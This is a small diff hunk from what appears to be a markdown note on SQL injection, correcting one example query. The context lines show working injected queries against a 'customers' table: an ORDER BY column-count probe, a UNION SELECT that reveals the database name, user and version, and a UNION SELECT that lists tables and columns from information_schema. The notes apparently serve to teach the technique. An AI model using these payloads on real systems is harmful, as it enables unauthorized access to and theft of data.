@@ -98,7 +98,7 @@ Injection:
 ```
 gives:
 ```
-SELECT * from customers WHERE name LIKE '%' order by 1,2,3 -- //'";
+SELECT * from customers WHERE name LIKE '' order by 1,2,3 -- //'";
 SELECT * from customers WHERE name LIKE '%' union select database(), user(), @@version, null, null -- //'";
 SELECT * from customers WHERE name LIKE '' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
 ```
